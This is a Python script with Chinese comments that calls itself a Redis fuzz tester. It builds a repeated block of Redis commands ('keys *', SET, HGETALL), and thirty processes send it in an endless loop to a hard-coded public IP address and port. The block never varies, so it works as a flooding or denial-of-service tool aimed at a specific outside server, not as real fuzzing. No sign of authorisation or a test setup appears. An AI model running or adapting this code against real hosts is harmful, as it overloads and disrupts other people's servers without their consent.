# Optimized code with a simpler progress display for Redis fuzz testing

import socket
import sys
import multiprocessing

# 全局变量
HOST = '91.172.23.191'
PORT = 3209

def generate_fuzz_content(max_length=100000):
    """为Redis生成模糊测试内容。"""
    content = "keys *\r\n"
    for count in range(max_length):
        content += "SET aaaaaaaa bbbbbbbb\r\n" + "HGETALL R6240H0\r\n"
        # 每1000次打印一次进度
        if count % 1000 == 0:
            print(f"\r进度: {count}/{max_length}", end="")
    print("\r\n内容生成完成。\r\n")
    return content

def run_fuzzing_thread(fuzz_content, name):
    """运行单个模糊测试线程。"""
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((HOST, PORT))
        print(f'已连接到服务器: {HOST}:{PORT}，线程名称: {name}')

        while True:
            client_socket.send(fuzz_content.encode('utf-8'))

    except socket.error as e:
        print(f'线程 {name} 遇到套接字错误: {e}')

def start_fuzzing(fuzz_content, thread_count=1):
    """开始模糊测试过程。"""
    processes = []
    for i in range(thread_count):
        thread_name = f"thread_{i+1}"
        pname = multiprocessing.Process(target=run_fuzzing_thread, args=(fuzz_content, thread_name))
        processes.append(pname)
        pname.start()

    for p in processes:
        p.join()

    print("所有工作线程已完成")

def main(host, port):
    """主函数，用于执行模糊测试。"""
    max_length = 100  # 最大长度
    thread_count = 30  # 线程数

    # 更新全局变量
    global HOST, PORT
    HOST = host
    PORT = port

    # 生成模糊测试内容
    fuzz_content = generate_fuzz_content(max_length)

    # 开始模糊测试
    try:
        start_fuzzing(fuzz_content, thread_count)
    except KeyboardInterrupt:
        print('\n\n模糊测试已由用户终止。\n')

if __name__ == "__main__":
    # 从命令行获取IP和端口参数
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    else:
        host = HOST
        port = PORT

    main(host, port)
